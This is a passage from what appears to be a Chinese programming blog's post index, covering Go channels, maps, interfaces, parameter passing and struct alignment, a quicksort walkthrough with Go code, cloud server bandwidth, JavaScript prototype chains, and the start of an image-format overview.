unsafe.Sizeof(unsafe.Pointer(uintptr(0)))\n    cptr += unsafe.Sizeof(uint16(0))\n    return *(*uint32)(unsafe.Pointer(cptr)) > 0\n}\n```\n\n+ 正常做法是要监听 close()的 channel,  收到通知\n\n  如果您不知道通道是否关闭并且盲目地写入该通道，则说明您的程序设计不良。 重新设计它，使其在关闭后无法写入。\n\n+ 可用 bool值，但是会多读一个值\n\n  ```go\n  value, ok := <- channel \n  if !ok {    \n    // channel was closed and drained \n  }\n  ```\n\n\n\n\n### 1.4 channel 的零值\n\nchannel的零值是nil。也许会让你觉得比较奇怪，nil的channel有时候也是有一些用处的。\n\n+ 因为对一个nil的channel发送和接收操作会永远阻塞\n+ 在select语句中操作nil的channel永远都不会被select到。这使得我们可以用nil来激活或者禁用case。\n\n```go\nfunc main() {\n\n\tvar c chan int\n\tfmt.Println(c)\n\n\tfor {\n\t\tselect {\n\t\tcase <-c:\n\t\t\tfmt.Println(\"nerver\")\n\t\tdefault:\n\t\t}\n\t}\n}\n\n\n// 输出 nil 之后无线循环，不会输出 nerver\n```\n\n\n\n### 1.5 优雅的关闭 channel\n\nhttps://www.liuvv.com/p/8b210700.html\n\n\n\n### 1.6 什么时候用 channel， 什么时候用Mutex\n\nhttps://github.com/golang/go/wiki/MutexOrChannel\n\nchannel的能力是让数据流动起来，擅长的是数据流动的场景\n\n+ 传递数据的所有权，即把某个数据发送给其他协程\n\n+ 分发任务，每个任务都是一个数据\n\n+ 交流异步结果，结果是一个数据\n\nmutex的能力是数据不动，某段时间只给一个协程访问数据的权限擅长数据位置固定的场景\n\n+ 缓存\n\n+ 状态\n\n\n\n\n# 2. 数据结构\n\n### 2.1 map 为什么无序\n\n+ map扩容, key 会移动\n\n  map 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。\n\n+ 底层代码随机值遍历\n\n  Go 做得更绝，当我们在遍历 map 时，并不是固定地从 0 号 bucket 开始遍历，每次都是从一个随机值序号的 bucket 开始遍历，并且是从这个 bucket 的一个随机序号的 cell 开始遍历。这样，即使你是一个写死的 map，仅仅只是遍历它，也不太可能会返回一个固定序列的 key/value 对了。\n\n\n\n### 2.2 map 的key 可以是什么类型\n\nmap中的key可以是任何的类型，只要它的值能比较是否相等. Go语言里是无法重载操作符的\n\n- 布尔值\n\n- 数字\n\n- 字符串\n\n- 指针\n\n  Pointer values are comparable. Two pointer values are equal if they point to the same variable or if both have value nil. Pointers to distinct zero-size variables may or may not be equal.\n\n  当指针指向同一变量，或同为nil时指针相等，但指针指向不同的零值时可能不相等。\n\n- Channel\n\n  Channel values are comparable. Two channel values are equal if they were created by the same call to make or if both have value nil.\n\n  Channel当指向同一个make创建的或同为nil时才相等。\n\n- Interface\n\n  Interface values are comparable. Two interface values are equal if they have identical dynamic types and equal dynamic values or if both have value nil.\n\n  当接口有相同的动态类型并且有相同的动态值，或者值为都为nil时相等。\n\n- 结构体\n\n  Struct values are comparable if all their fields are comparable. Two struct values are equal if their corresponding non-blank fields are equal.\n\n  结构体当所有字段的值相同，并且没有相应的非空白字段时，则他们相等。\n\n- 只包含上述类型的数组。\n\n  Array values are comparable if values of the array element type are comparable. Two array values are equal if their corresponding elements are equal.\n\n  两个数组只要他们包括的元素，每个元素的值相同，则他们相等。\n\n但不能是：\n\n- slice\n- map\n- function\n\n\n\n### 2.3 map 如何有序遍历\n\n+ map 默认是无序的，不管是按照 key 还是按照 value 默认都不排序。\n\n+ 有序遍历\n\n  如果你想为 map 排序，需要将 key（或者 value）拷贝到一个切片，再对切片排序（使用 sort 包），然后可以使用切片的 for-range 方法打印出所有的 key 和 value。\n\n\n\n\n### 2.4 slice 和 map 并发安全吗\n\nmap和slice都是并发不安全的, 解决方案:\n\n+ 加锁\n+ 使用 channel 串行化\n+ sync.Map\n\n\n\n# 5. interface\n\n### 5.1 interface 当参数时的坑, 传递 nil 也不是 nil\n\n如果需要判断, 请用反射 `reflect.ValueOf(i).IsNil()`\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tA() error\n}\n\ntype T struct {\n}\n\nfunc (t *T) A() error {\n\treturn nil\n}\n\nfunc testInterface(i I) {\n\tif i == nil {\n\t\tfmt.Println(\"i is nil\")\n\t} else {\n\t\tfmt.Println(\"i is not nil\")\n\t}\n}\nfunc main() {\n\tt := new(T)\n\tt = nil\n\ttestInterface(t) //i is not nil\n}\n\n```\n\n\n\n# 6. make\n\n### 6.1 make时传递的数字参数\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 0)\n\tfmt.Println(s) //[]\n\ts = append(s, 1, 2, 3)\n\tfmt.Println(s) //[1 2 3]\n}\n\n```\n\n如果传递了个数, 就是有默认值了\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 5)\n\tfmt.Println(s) //[0 0 0 0 0]\n\n  s = append(s, 1, 2, 3)\n\tfmt.Println(s) //[0 0 0 0 0 1 2 3]\n}\n```\n\n\n\n### 6.2 make 和 new的区别\n\n+ make 只能用于 slice,map,channel\n\n  返回的类型就是这三个类型本身，而不是他们的指针类型，因为这三种类型是引用类型。\n\n+ new(T) 返回 T 的指针 *T 并指向 T 的零值。\n\n\n\n# 7. 函数\n\n### 7.1 函数参数传递，是值还是引用\n\n​\tGo 中函数传参仅有值传递一种方式, 只有slice, map, channel 本身是引用类型, 所以可以改\n\n+ 其实传递的就是值,但是为什么能改内容呢?\n\n  ```go\n  func ChangeMap(value map[string]string) {\n    fmt.Printf(\"map内部 %p\\n\", &value)\n    value[\"age\"] = \"30\"\n  }\n  \n  func ChangeSlice(value []string) {\n    fmt.Printf(\"slice内部 %p\\n\", &value)\n    value[0] = \"haha\"\n  }\n  \n  func main() {\n    map1 := make(map[string]string)\n    map1[\"age\"] = \"21\"\n    fmt.Printf(\"map外部 %p\\n\", &map1)\n    fmt.Println(map1[\"age\"])\n    ChangeMap(map1)\n    fmt.Println(map1[\"age\"])\n  \n    slice1 := make([]string, 0)\n    slice1 = append(slice1, \"hehe\")\n    fmt.Println(slice1)\n    fmt.Printf(\"slice外部 %p\\n\", &slice1)\n    ChangeSlice(slice1)\n    fmt.Println(slice1)\n  }\n  \n  /*\n  map外部 0xc000092018\n  21\n  map内部 0xc000092028\n  30\n  \n  \n  [hehe]\n  slice外部 0xc00008a040\n  slice内部 0xc00008a080\n  [haha]\n  */\n  ```\n\n+ 普通的类型就是值传递\n\n  ```go\n  package main\n  \n  import \"fmt\"\n  \n  func main() {\n  \ta := 10\n  \tfmt.Printf(\"%#v\\n\", &a) // (*int)(0xc420018080)\n  \tvFoo(a)\n  }\n  \n  func vFoo(b int) {\n  \tfmt.Printf(\"%#v\\n\", &b) // (*int)(0xc420018090)\n  }\n  ```\n\n   \n\n\n# 8. 其他问题\n\n### 8.1 字节和字节对齐\n\n+ 字节数 \n\n  + 64位系统下, int 默认 int64 ,  8个字节, \n\n  + float 64,  8个字节\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\nfunc main() {\n\tvar a int\n\tfmt.Println(unsafe.Sizeof(a)) //8\n\n\tvar b int32\n\tfmt.Println(unsafe.Sizeof(b)) //4\n\n\tvar c int64\n\tfmt.Println(unsafe.Sizeof(c)) //8\n\n\tvar d float64\n\tfmt.Println(unsafe.Sizeof(d)) //8\n\n\tvar e float32\n\tfmt.Println(unsafe.Sizeof(e)) //4\n\n\tvar f string\n\tfmt.Println(unsafe.Sizeof(f)) //16\n\n\tvar g chan int\n\tfmt.Println(unsafe.Sizeof(g)) //8\n\n\tvar h []int\n\tfmt.Println(unsafe.Sizeof(h)) //24\n\n\tvar i map[int]int\n\tfmt.Println(unsafe.Sizeof(i)) //8\n}\n```\n\n+ 字节对齐(根据操作系统的位数对齐的)\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\ntype Info1 struct {\n\tsex    bool //1\n\tstatus int8 //1\n}\n\ntype Info2 struct {\n\tsex bool //1\n\tage int  //8\n}\n\ntype Info3 struct {\n\tsex bool  //1\n\tage int32 //4\n}\n\ntype Info4 struct {\n\tsex    bool //1\n\tage    int  //8\n\tstatus int8 //1\n}\n\ntype Info5 struct {\n\tsex    bool //1\n\tstatus int8 //1\n\tage    int  //8\n}\n\ntype Info6 struct {\n\ta bool   //1\n\tb string //16\n\tc bool   //1\n}\n\ntype Info7 struct {\n\ta bool   //1\n\tc bool   //1\n\tb string //16\n}\n\nfunc main() {\n\tfmt.Println(unsafe.Sizeof(Info1{})) //2\n\tfmt.Println(unsafe.Sizeof(Info2{})) //16(8+8)\n\tfmt.Println(unsafe.Sizeof(Info3{})) //8(4+4)\n\tfmt.Println(unsafe.Sizeof(Info4{})) //24(8+8+8)\n\tfmt.Println(unsafe.Sizeof(Info5{})) //16(1+1+8 = 8+8)\n\tfmt.Println(unsafe.Sizeof(Info6{})) //32(1+16+1 = 8+16+8)\n\tfmt.Println(unsafe.Sizeof(Info7{})) //16(1+1+16 = 8+16)\n}\n```\n\n\n\n### 8.2 非运行多态\n\ngo 语言中，当子类调用父类方法时，“作用域”将进入父类的作用域，看不见子类的方法存在\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n\n\n# 9. 引用和传值\n\nGo语言是没有引用传递的, Go里只有传值（值传递）。\n\nslice / map / chan 是golang的3个引用类型， 本质上 它本身/或者它的一个成员 是指针\n\n+ map\n\n  把 map本身想象成指针, 看指针的值不一样\n\n```go\nfunc main() {\n\tpersons := map[string]int{\n\t\t\"张三\": 19,\n\t}\n\tfmt.Println(\"map old:\", persons)\n\tfmt.Printf(\"原始map的内存地址是：%p\\n\", &persons)\n\tmodify(persons)\n\tfmt.Println(\"map new:\", persons)\n}\n\nfunc modify(p map[string]int) {\n\tfmt.Printf(\"函数里接收到map的内存地址是：%p\\n\", &p)\n\tp[\"张三\"] = 20\n}\n\n\n/*\nmap old: map[张三:19]\n\n原始map的内存地址是：0xc000100018\n函数里接收到map的内存地址是：0xc000100028\n\nmap new: map[张三:20]\n\n*/\n```\n\n+ Slice\n\n  通过下标可以直接修改, 但是 append 指针变了, 需要传出来才可以\n\n```go\nfunc main() {\n\tages := []int{1, 2, 3}\n\tfmt.Println(\"ages old:\", ages)\n\tfmt.Printf(\"原始slice的头内存地址%p  指针:%p\\n\", ages, &ages)\n\tmodify(ages)\n\tfmt.Println(\"ages new:\", ages)\n}\n\nfunc modify(ages []int) {\n\tfmt.Printf(\"函数里的头内存地址%p   指针:%p\\n\", ages, &ages)\n\tages[0] = 0\n\tages = append(ages, 4, 5, 6, 7)\n\tfmt.Printf(\"函数里的 append 头内存地址%p  指针:%p\\n\", ages, &ages)\n}\n\n\n/*\nages old: [1 2 3]\n\n原始slice的头内存地址\t\t   0xc00011c000       \t\t\t  指针:0xc00011a000\n函数里的头内存地址         0xc00011c000 \t\t\t         指针:0xc00011a060 (内部的指针地址,意义不大)\n函数里的 append 头内存地址 0xc000120040  \t\t\t  \t   指针:0xc00011a060 (内部的指针地址,意义不大)\n\nages new: [0 2 3]\n\n*/\n```\n\n","tags":["golang"],"categories":["1_golang基础"]},{"title":"快速排序的深刻理解","url":"%2Fp%2Fff8068c0.html","content":"\n每次写快速排序，写过一次搞明白了，过一段时间写又忘记了。这次采用牛郎织女的故事，加深记忆。\n\n+ 牛郎织女从两边往中间走见面，牛郎在左边，织女在右边.  他们选取路上最左的一个数字作为交流信号。\n\n+ 织女先向左走，大于等于就走，小于就停。牛郎向右走，小于等于就走，大于就停，然后两人打电话交换脚下的数据。\n+ 接着走，接着打电话交换数据，直到两人相遇。相遇后，把两人脚下的数据和心中的数字做交换。\n\n+ 至此，相遇点左边都是比心中数字小，相遇点右边都是比心中数字大。\n\n<!-- more -->\n\n\n\n# 1. 快速排序\n\n### 1.1 原理\n\n原始数据 “**6 1 2 7 9 3 4 5 10 8**”，目标：左边小于参考值，右边大于参考值\n\n![1](快速排序的深刻理解/1.png)\n\n\n\n把第一个值 **6** 作为参考值，分别从初始序列“**6 1 2 7 9 3 4 5 10 8**”两端开始“探测”。先从**右**往**左**找一个小于 **6** 的数，再从**左**往**右**找一个大于 **6** 的数，然后交换他们。\n\n这里可以用两个变量 **i** 和 **j**，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵 i”和“哨兵 j”。刚开始的时候让哨兵 i 指向序列的最左边（即 **i=1**），指向数字 **6**。让哨兵 **j** 指向序列的最右边（即 **j=10**），指向数字 **8**。\n\n---\n\n![1](快速排序的深刻理解/2.png)\n\n首先哨兵 **j** 开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵 **j** 先出动，这一点非常重要（后面会解释）。哨兵 **j** 一步一步地向左挪动（即 **j--**），直到找到一个小于 **6** 的数停下来。接下来哨兵 **i** 再一步一步向右挪动（即 **i++**），直到找到一个数大于 **6** 的数停下来。最后哨兵 **j** 停在了数字 **5** 面前，哨兵 **i** 停在了数字 **7** 面前。\n\n现在交换哨兵 **i** 和哨兵 **j** 所指向的元素的值。交换之后的序列如下：6 1 2 **5** 9 3 4 **7** 10 8，到此，第一次交换结束。\n\n![1](快速排序的深刻理解/3.png)\n\n---\n\n\n\n接下来开始哨兵 **j** 继续向左挪动（再友情提醒，每次必须是哨兵 **j** 先出发）。他发现了 **4**（比基准数 **6** 要小，满足要求）之后停了下来。哨兵 **i** 也继续向右挪动的，他发现了 **9**（比基准数 **6** 要大，满足要求）之后停了下来。\n\n![1](快速排序的深刻理解/4.png)\n\n此时再次进行交换，交换之后的序列如下：6 1 2 5 **4** 3 **9** 7 10 8，第二次交换结束。\n\n![1](快速排序的深刻理解/5.png)\n\n\n\n---\n\n\n\n“探测”继续。哨兵 **j** 继续向左挪动，他发现了 **3**（比基准数 **6** 要小，满足要求）之后又停了下来。哨兵 **i** 继续向右移动，糟啦！此时哨兵 **i** 和哨兵 **j** 相遇了，哨兵 **i** 和哨兵 **j** 都走到 **3** 面前。说明此时“探测”结束。\n\n![1](快速排序的深刻理解/6.png)\n\n\n\n我们将基准数 **6** 和 **3** 进行交换。\n\n![1](快速排序的深刻理解/7.png)\n\n交换之后的序列如下：**3** 1 2 5 4 **6** 9 7 10 8。\n\n![1](快速排序的深刻理解/8.png)\n\n\n\n到此第一轮“探测”真正结束。此时以基准数 **6** 为分界点，**6** 左边的数都小于等于 **6**，**6** 右边的数都大于等于 **6**。回顾一下刚才的过程，其实哨兵 **j** 的使命就是要找小于基准数的数，而哨兵 **i** 的使命就是要找大于基准数的数，直到 **i** 和 **j** 碰头为止。\n\n---\n\nOK，解释完毕。现在基准数 **6** 已经归位，它正好处在序列的第 **6** 位。此时我们已经将原来的序列，以 **6** 为分界点拆分成了两个序列，左边的序列是“**3 1 2 5 4**”，右边的序列是“ **9 7 10 8** ”。\n\n接下来开始递归把。\n\n\n\n### 1.2 代码\n\n```go\nfunc main() {\n\tarr := []int{2, 1}\n\tfmt.Println(\"origin\", arr)\n\tQuickSort(arr, 0, len(arr)-1)\n\tfmt.Println(\"sort\", arr)\n}\n\nfunc QuickSort(arr []int, left int, right int) {\n\tif left < right {\n\t\tpartIndex := PartIndex(arr, left, right)\n\t\tQuickSort(arr, left, partIndex-1)\n\t\tQuickSort(arr, partIndex+1, right)\n\t}\n}\n\nfunc PartIndex(arr []int, left int, right int) int {\n\tmid := arr[left]\n\torigin := left\n\tfor left < right {\n\t\tfor arr[right] >= mid && left < right {\n\t\t\tright--\n\t\t}\n\t\tfor arr[left] <= mid && left < right {\n\t\t\tleft++\n\t\t}\n\t\tarr[left], arr[right] = arr[right], arr[left]\n\t}\n\n\tarr[left], arr[origin] = arr[origin], arr[left]\n\treturn left\n}\n```\n\n\n\n# 2. 实现的问题\n\n### 2.1 为什么从右往左\n\n因为你是正序排，以 4, 11, 9 为例。\n\n+ 先左走，后右走\n\n  mid = 4， 左边的 <= 4 才走，走到下标 1。右边的 >= 4 才走，也走到下标1（左<右）。\n\n  一交换，11，4，9 不对了。\n\n  停的值会比选的值大，我们希望停的位置比选的值小。\n\n+ 先右走，后左走\n\n  右边的 >= 4 才走，走到下标0，mid = 4， 左边的 <= 4 才走，不走，下标0（左<右）。\n\n  交换后正常。\n\n\n### 2.2 为什么大于等于，而不是大于\n\n如果就两个数： 2，1。\n\n+ 大于等于时\n\n  mid = 2， 右边的 >= 2 才走，不动。 左边的 <= 2 才走，会走到下标 1。 \n\n  在下标 1 相遇后，和开头交换。\n\n+ 大于时\n\n  mid = 2， 右边的 > 2 才走，不动。左边的 < 2 才走，不动。 \n\n  死循环。\n\n\n\n# 3. 头脑风暴\n\n+ 先写一个分区函数，需要返回index，上层根据这个index递归调用。\n+ 一个大循环套两个小循环，右边比较先走，左边比较再走，然后交换。\n+ 两个碰在一起，和选的中间值交换，然后返回index即可。\n\n\n\n# 4. 参考资料\n\n+ https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html\n\n+ https://blog.csdn.net/qq_43990023/article/details/102297065\n\n","tags":["算法"],"categories":["算法"]},{"title":"云服务器带宽介绍","url":"%2Fp%2F13ebdb91.html","content":"\n\n\n# 1. 云服务器带宽\n\n### 1.1 购买的带宽是上行还是下行？\n\n用户花钱购买的带宽是指云服务器上行带宽，注意这里指的上行带宽不是上传，而是从云服务器下载东西。\n\n指云服务器上行带宽，**即云服务器出网带宽，流量流出云服务器的方向。**\n\n<!-- more -->\n\n阿里云服务器只有公网出方向带宽是收费的，公网入方向带宽是免费的。\n\n关于阿里云服务器带宽上行、下行、出网及入网参考下表：\n\n| 带宽类别             | 是否收费 | 说明                                                         |\n| -------------------- | -------- | ------------------------------------------------------------ |\n| 下行带宽（入网带宽） | 免费     | 流入云服务器ECS的带宽，例如：云服务器ECS下载外部网络资源。FTP客户端上传资源到云服务器ECS。 |\n| 上行带宽（出网带宽） | 收费     | 流出云服务器ECS的带宽，例如：云服务器ECS对外提供访问。FTP客户端下载云服务器ECS内部资源。 |\n\n总结一下，用户**花钱购买的阿里云服务器公网带宽是指上行带宽，上行带宽也是出网带宽，是指流量流出云服务器方向的带宽**。\n\n\n\n### 1.2 购买云服务器可以不要带宽吗？\n\n购买阿里云服务器ECS可以不要公网带宽，内网带宽是免费的，如果不要公网带宽也不会分配独立公网IP地址。购买时，不要勾选“分配公网 IPv4 地址”，则该台云服务器就没有公网带宽。\n\n想要独立公网IP地址，但是带宽值想选择0，这是不行的，勾选公网IP后，带宽值至少选择1M。\n\n\n\n+ 不要公网带宽，对云服务器有什么影响？\n\n  影响就是云服务器不能在公网访问，也不能对外提供服务。例如，如果你的云服务器作为Web服务器，在服务器上托管了网站，那么访客无法通过公网来访问你的服务器。\n\n\n\n### 1.3 1M带宽出网速度\n\n阿里云服务器1M带宽下载速度是128KB/S，为什么不是1M/S？\n\n这是由于IDC云厂商带宽多少是针对bit（比特）来计算的，而用户实际下载是根据Byte（字节）来计算的，8bit = 1Byte，所以IDC云厂商提供的带宽和实际下载速度之间有个8倍的关系，所以云服务器公网带宽实际下载速度要除以8。\n\n\n\n### 1.4 1M带宽服务器可以支撑多少人同时在线\n\n+ 服务器1M带宽并发数计算\n\n  服务器1M带宽的下载速度是128KB/S，不是1M/秒。网站类型不同网页大小也不同，如：小说站和图片站是没有可比性的，服务器带宽网假设网页优化后的大小为30KB；\n\n  那么，1M带宽可支撑4个用户在1秒内同时打卡网页，所以，1M带宽1秒内的并发数为4。\n\n\n\n+ 网站8秒原则\n\n  用户等待网站打开时间如果超过8秒，就会不耐烦继而关闭网站，如果将网页打开时间稍微延长，并发数可以再延长一些。比如，1M带宽可支撑8个用户在2秒内同时打开网页，以此类推。但是随着网络速度的提升，用户对网页打开速度越来越挑剔，不用等到8秒，5秒钟打不开可能就放弃了。\n\n  \n\n服务器带宽网以1M带宽1秒并发数4来计算，一天86400秒，一天可支撑34万IP，哈哈，这不是扯淡么，用户不会这么均匀地访问网站，网站一天访问量高峰集中在上午9点到11点、下午3点到5点和晚上8点到10点，这个时间段并发数4也是不小的访问量。\n\n\n\n阿里云服务器1M带宽支持多少人在线？日均2000IP的小网站不成问题。当然网站图片媒体文件最好接入CDN。\n\n图片或者一些媒体文件可以托管到OSS，而且当用户第一次访问网站后，在浏览其他页面，或者进行二次访问，浏览器会优先加载本机缓存，并不是用户每次浏览PV都要占用首次带宽。\n\n\n\n### 1.5 云服务器带宽峰值\n\n阿里云服务器带宽最大可选200Mbps，详细参考下表：\n\n|              限制项              |                         普通用户限制                         |\n| :------------------------------: | :----------------------------------------------------------: |\n|         入带宽峰值(免费)         | 当所购出带宽峰值小于等于10 Mbit/s时，阿里云会分配10 Mbit/s入方向带宽。<br/>当所购出带宽峰值大于10 Mbit/s时，阿里云会分配与购买的出带宽峰值相等的入方向带宽。 |\n|         出带宽峰值(收费)         | 按使用流量计费：100 Mbit/s<br/>按固定带宽计费：包年包月实例：200 Mbit/s  按量付费实例：100 Mbit/s |\n| 单实例更换分配的公网IP地址的限制 | 新建实例六小时内可以更换公网IP地址，一台实例最多可以更换三次。 |\n\n\n\n### 1.6 服务器带宽选多少合适？\n\n服务器带宽选择是没有标准的，用户实际的使用场景不同带宽值自然不同，例如电影直播下载类的应用就很占带宽，一方面需要高带宽，一方面可以考虑到使用OSS、CDN等产品来降低带宽成本。\n\n\n\n下载类/直播类的网站对服务器带宽要求高，具体选择多少带宽还是要根据网站实际用户规模、同时下载人数等；服务器带宽网以阿里云服务器为例，一般建议用户不要全部依赖带宽，可以将文件存储到成本更加廉价的 OSS 上，然后将网站接入 CDN 减少对服务器资源及带宽的占用，可以进一步降低带宽成本。\n\n\n\n如果是阿里云服务器选择带宽，服务器带宽网建议用户在应用允许的情况下，尽量将带宽值控制在5M及5M以上，可以搭配阿里云OSS 和CDN 等产品，来降低公网带宽的占用，毕竟服务器带宽的成本还是挺高的。\n\n\n\n# 2. 参考资料\n\n+ http://fuwuqidaikuan.com/","tags":["云服务器"],"categories":["计算机基础"]},{"title":"javascript原链的自我理解","url":"%2Fp%2F6d00c950.html","content":"\n### Object 和 Function\n\n首先在 javascript 中 我们要明确Object 和 Function两个概念:\n\n+ 万物皆对象\n\n+ 所有对象都是函数创建出来\n\n仔细琢磨这两句话, 其实说的 Object 和 Function 是一个鸡生蛋还是蛋生鸡的问题. 为什么这么讲呢? 因为函数也是一个对象, 但对象又是函数创建出来的. \n\n 其实原型链的一切江湖恩怨都是围绕着Function和Object两大家族展开的.\n\n\n\n<!-- more -->\n\n### 鸡家族和蛋家族\n\n+ 有创造力的函数我们称为Function鸡家族, 没有创造力的对象我们称为Object蛋家族\n\n+ 芸芸众生,你我她都是一个蛋对象(~~). 我们都是被某一个函数创建出来, 我们可以称为创建我们的这个函数为鸡爸爸, 我们每人都有一个鸡爸爸\n\n+ 注意创建我们的鸡爸爸函数, 也是一个对象. 它曾经也是被某一个函数创建出来的\n\n\n\n### prototype鸡技能仓库\n\n+ prototype 是 Function鸡家族独有的技能仓库, 没有创造能力的蛋家族没有这个仓库.\n\n+ 鸡技能仓库内放着鸡爸爸的属性和函数等技能. 例如吃小米、捉虫子、变凤凰...\n\n+ 注意鸡技能仓库属于 Object蛋家族,  因为鸡技能仓库没有创造能力, 鸡才有创造力\n\n\n\nOK, 创建我们的鸡爸爸它拥有 prototype 属性.  意味着每个鸡都拥有一个技能仓库, 仓库的大门上也写着拥有者名字(constructor属性), 即这个鸡本人的名字\n\n+ prototype 是鸡的属性, 而constructor是鸡技能仓库的属性\n\n  \n\n###  \\__proto\\__ 拥有鸡爸爸技能仓库的钥匙\n\n\n\n+ \\__proto\\__ 是一个隐藏的指针, 万物皆有这个指针. 我们可以将这个 \\__proto\\__ 理解为 我拿着一把我鸡爸爸技能仓库的钥匙\n\n+ 我拿了一把鸡爸爸技能仓库钥匙, 意味着我可以使用鸡爸爸技能仓库的技能,  例如吃小米、捉虫子、变凤凰...\n\n\n\n那么鸡的 \\__proto\\__ 指向谁? 鸡技能仓库的  \\__proto\\__ 又指向谁?\n\n+ 创建鸡(函数家族)的鸡爸爸 是function Function(),  所以鸡的  \\__proto\\__ 指向 Function.prototype\n\n+ 创建鸡仓库(对象家族)的鸡爸爸是function  Object(), 所以鸡仓库的  \\__proto\\__ 指向 Object.prototype\n\n+ 最后 Object. \\__proto\\__指向了 null\n\n\n\nOK, 如果我调用一个函数, 那么先在我身上找这个函数. \n\n如果没找到, 就拿起我的钥匙去我鸡爸爸的技能仓库去找.\n\n如果还没找到, 就拿起技能仓库对象的钥匙, 去仓库对象鸡爸爸的技能仓库去找, 一直找到 null为止.\n\n\n\n### 分析一张图\n\n![img](javascript原型链的自我理解/1.png)\n\n\n\n上面部分:\n\n+ f1 = new Foo()  我是f1, 没有prototype仓库,  我的  \\__proto\\__ 指向了鸡爸爸的仓库 Foo.prototype\n+ 鸡爸爸(Function Foo)的技能仓库(prototype)是 Foo.prototype, 仓库的名字(constructor)是 function Foo()\n\n+ 鸡技能仓库Foo.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null (前面已经提过)\n\n左侧部分:\n\n+ function Foo的鸡爸爸是 function Function(), 因为是这个函数创建了鸡爸爸, 所以 Function Foo的 \\__proto\\__指向了 Function.prototype 仓库\n+ 再看function Function()  它的技能仓库是 Function.prototype, 技能仓库名字是 function Function() .  另外过分的是function Function() 是被它自己function Function()创建出来的, 所以它的 \\__proto\\__指向了自己的技能仓库\n\n中间部分: \n+ function Object的  \\__proto\\__  指向了Function.prototype 看来所有鸡的钥匙都指向了Function.prototype\n+ 技能仓库Function.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null \n\n\n\n### instanceof 寻仓库运算符\n\ninstanceof运算符的第一个变量是一个对象(蛋家族)，暂时称为A；第二个变量一般是一个函数(鸡家族)，暂时称为B。\n\nInstanceof的判断队则是：沿着A的 \\__proto\\__ 这条线来找，同时沿着B的prototype这条线来找，如果两条线能找到同一个引用，即同一个对象，那么就返回true。如果找到终点还未重合，则返回false。\n\n\n\n```javascript\nconsole.log(Object instanceof Function); //true\nconsole.log(Function instanceof Object); //true\nconsole.log(Function instanceof Function); //true\n```\n\n\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"常见图片格式","url":"%2Fp%2F7ca2c4cd.html","content":"\n# 1. 前言\n\n#### 1.1 有损vs无损\n\n图片文件格式有可能会对图片的文件大小进行不同程度的压缩，图片的压缩分为有损压缩和无损压缩两种。\n\n- 有损压缩。指在压缩文件大小的过程中，损失了一部分图片的信息，也即降低了图片的质量，并且这种损失是不可逆的，我们不可能从有一个有损压缩过的图片中恢复出全来的图片。常见的有损压缩手段，是按照一定的算法将临近的像素点进行合并。\n- 无损压缩。只在压缩文件大小的过程中，图片的质量没有任何损耗。我们任何时候都可以从无损压缩过的图片中恢复出原来的信息。\n\n<!-- more -->\n\n#### 1.2 索引色vs直接色\n\n计算机在表示颜色的时候，有两种形式，一种称作索引颜色([Index Color](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Indexed_color))，一种称作直接颜色([Direct Color](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Color_depth%23Direct_color))。\n\n- 索引色。用一个数字来代表（索引）一种颜色，在存储图片的时候，存储一个数字的组合，同时存储数字到图片颜色的映射。这种方式只能存储有限种颜色，通常是256种颜色，对应到计算机系统中，使用一个字节的数字来索引一种颜色。\n- 直接色。使用四个数字来代表一种颜色，这四个数字分别代表这个颜色中红色、绿色、蓝色以及透明度。现在流行的显示设备可以在这四个维度分别支持256种变化，所以直接色可以表示2的32次方种颜色。当然并非所有的直接色都支持这么多种，为压缩空间使用，有可能只有表达红、绿、蓝的三个数字，每个数字也可能不支持256种变化之多。\n\n#### 1.3 点阵图vs矢量图\n\n- 点阵图，也叫做位图，像素图。\n\n  构成点阵图的最小单位是象素，位图就是由象素阵列的排列来实现其显示效果的，每个象素有自己的颜色信息，在对位图图像进行编辑操作的时候，可操作的对象是每个象素，我们可以改变图像的色相、饱和度、明度，从而改变图像的显示效果。点阵图缩放会失真，用最近非常流行的沙画来比喻最恰当不过，当你从远处看的时候，画面细腻多彩，但是当你靠的非常近的时候，你就能看到组成画面的每粒沙子以及每个沙粒的颜色。\n\n- 矢量图，也叫做向量图。\n\n  矢量图并不纪录画面上每一点的信息，而是纪录了元素形状及颜色的算法，当你打开一付矢量图的时候，软件对图形象对应的函数进行运算，将运算结果[图形的形状和颜色]显示给你看。无论显示画面是大还是小，画面上的对象对应的算法是不变的，所以，即使对画面进行倍数相当大的缩放，其显示效果仍然相同(不失真)。\n\n\n\n# 2. BMP(古老)\n\n**BMP**取自位图**B**it**m**a**p**的缩写，是无损的、既支持索引色也支持直接色的、点阵图。\n\n### 2.1 